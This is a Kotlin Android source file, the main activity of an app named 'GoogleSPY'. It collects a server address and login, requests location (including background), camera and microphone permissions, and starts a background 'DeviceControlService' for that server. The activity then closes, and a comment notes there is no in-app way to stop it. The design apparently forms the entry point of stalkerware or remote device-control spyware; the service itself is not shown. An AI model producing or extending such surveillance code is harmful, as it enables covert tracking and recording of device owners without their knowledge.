package com.example.googlespy

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.ui.Modifier
import com.example.googlespy.service.DeviceControlService
import com.example.googlespy.ui.LoginScreen
import com.example.googlespy.ui.theme.GoogleSPYTheme

/**
 * Single-purpose: enter credentials and start background service, then close.
 * No in-app stop; stop only via Settings → Apps → [app] → Force stop.
 */
class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        startServiceAndClose(pendingServerUrl, pendingLogin, pendingPassword)
    }

    private var pendingServerUrl = ""
    private var pendingLogin = ""
    private var pendingPassword = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            GoogleSPYTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    LoginScreen(
                        onConnect = { url, login, pass ->
                            pendingServerUrl = url
                            pendingLogin = login
                            pendingPassword = pass
                            tryConnect()
                        },
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }

    private fun tryConnect() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        val toRequest = permissions.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (toRequest.isEmpty()) {
            startServiceAndClose(pendingServerUrl, pendingLogin, pendingPassword)
        } else {
            permissionLauncher.launch(toRequest.toTypedArray())
        }
    }

    private fun startServiceAndClose(serverUrl: String, login: String, password: String) {
        val intent = Intent(this, DeviceControlService::class.java).apply {
            putExtra(DeviceControlService.EXTRA_SERVER_URL, serverUrl)
            putExtra(DeviceControlService.EXTRA_LOGIN, login)
            putExtra(DeviceControlService.EXTRA_PASSWORD, password)
        }
        startService(intent)
        finish()
    }
}
